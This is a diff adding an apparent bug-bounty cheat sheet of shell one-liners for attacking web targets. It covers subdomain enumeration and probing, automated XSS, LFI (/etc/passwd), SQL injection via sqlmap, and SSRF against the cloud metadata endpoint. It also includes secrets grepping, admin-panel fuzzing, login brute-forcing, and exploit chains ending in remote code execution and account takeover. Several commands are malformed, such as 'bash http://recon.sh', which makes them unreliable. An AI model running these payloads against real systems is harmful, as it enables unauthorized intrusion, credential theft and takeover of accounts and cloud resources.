@@ -1,0 +1,120 @@
+
+→ SUBDOMAIN ENUMERATION + BRUTEFORCE + ALT DNS
+
+subfinder -d http://target.com -all -recursive -o subdomains.txt
+assetfinder --subs-only http://target.com | tee -a subdomains.txt
+amass enum -passive -d http://target.com | tee -a subdomains.txt
+findomain -t http://target.com | tee -a subdomains.txt
+cat subdomains.txt | sort -u | dnsx -a -resp -silent | tee resolved_subdomains.txt
+
+⸻
+
+→ MASS PROBING + PORT MAPPING + SCREENSHOT
+
+cat resolved_subdomains.txt | httpx -ports 80,443,8080,8443,3000,5000,7001 -threads 500 -title -tech-detect -web-server -o alive_httpx.txt
+aquatone -list alive_httpx.txt -out screenshots/
+
+⸻
+
+→ HISTORICAL URL COLLECTION + SENSITIVE FILES FILTER
+
+cat resolved_subdomains.txt | gauplus | tee historical_urls.txt
+cat historical_urls.txt | grep -Ei "\\.(zip|sql|rar|env|bak|git|config|json|log|gz|conf|md|ini|db)" | sort -u > sensitive_files.txt
+
+⸻
+
+→ PARAM DISCOVERY + XSS / LFI / SQLi / SSRF AUTO INJECTION
+
+cat historical_urls.txt | gf xss | uro | qsreplace '"><script>alert(1337)</script>' | httpx -mc 200 -o xss_hits.txt
+
+cat historical_urls.txt | gf lfi | qsreplace '../../../../etc/passwd' | httpx -mc 200 -o lfi_hits.txt
+
+cat historical_urls.txt | gf sqli | sqlmap -m - --batch --random-agent
+
+cat historical_urls.txt | gf ssrf | qsreplace "http://169.254.169.254/latest/meta-data/" | httpx -mc 200 -o ssrf_hits.txt
+
+⸻
+
+→ JS RECON + ENDPOINT EXTRACTION + SECRETS FINDER
+
+cat alive_httpx.txt | subjs | httpx -mc 200 | tee js_files.txt
+cat js_files.txt | xargs -I{} python3 LinkFinder/linkfinder.py -i {} -o cli | tee endpoints.txt
+cat js_files.txt | xargs -I{} gf api-keys
+
+⸻
+
+→ CORS MISCONFIGURATION
+
+cat alive_httpx.txt | nuclei -t vulnerabilities/cors/cors-misconfig.yaml -o cors_vulns.txt
+
+⸻
+
+→ ADMIN PANEL + API DISCOVERY (Hidden paths)
+
+cat alive_httpx.txt | ffuf -w wordlists/AdminPanels.txt -u "https://FUZZ" -mc 200 -o admin_hidden.txt
+
+⸻
+
+→ EXPLOIT CHAIN → AI LEVEL → AUTO EXAMPLES
+
+[*] XSS -> Steal JWT -> Bypass -> Account Takeover
+[*] Sensitive File + JS Secret -> Private API -> Business Logic Abuse
+[*] SSRF -> Metadata Access -> Cloud Secret -> Cloud Admin
+[*] LFI -> PHP Log Poisoning -> RCE
+[*] SQLi -> Dump Users -> Reset Password -> Full Account Takeover
+
+⸻
+
+→ LIVE 24/7 RECON AUTOMATION (Farming Mode)
+
+while true; do
+  bash http://recon.sh http://target.com
+  sleep 3600
+done
+
+⸻
+
+→ SLACK / DISCORD / TELEGRAM NOTIFIER (Ready)
+
+echo "Bug found XSS on /api" | curl -X POST -H 'Content-type: application/json' --data '{"text":"Bug Found: XSS on API"}' https://hooks.slack.com/services/XXXX
+
+⸻
+
+→ BONUS → HEADERS + MISCONFIG SCAN
+
+cat alive_httpx.txt | nuclei -t nuclei-templates/misconfiguration/ -o misconfigs.txt
+
+⸻
+
+→ BONUS → AWS + PUBLIC BUCKET DISCOVERY
+
+s3scanner scan -d http://target.com
+
+⸻
+
+→ BONUS → ADVANCED XSS DISCOVERY (Gxss + Kxss)
+
+cat js_files.txt | Gxss -c 100 | sort -u | dalfox pipe
+
+⸻
+
+→ BONUS → PASSWORD SPRAY / DEFAULT LOGIN (Login Bruteforce)
+
+ffuf -u https://target.com/login -w usernames.txt:FUZZ -w passwords.txt:PASS -X POST -d "username=FUZZ&password=PASS" -mc 200
+
+⸻
+
+→ FINAL OUTPUT → READY FOR POC + SUBMIT
+
+alive_httpx.txt → Live hosts
+js_files.txt → JS files
+endpoints.txt → API endpoints
+sensitive_files.txt → Sensitive data
+xss_hits.txt → XSS
+lfi_hits.txt → LFI
+ssrf_hits.txt → SSRF
+sqlmap logs → SQLi
+cors_vulns.txt → CORS issues
+admin_hidden.txt → Admin panels
+
+⸻
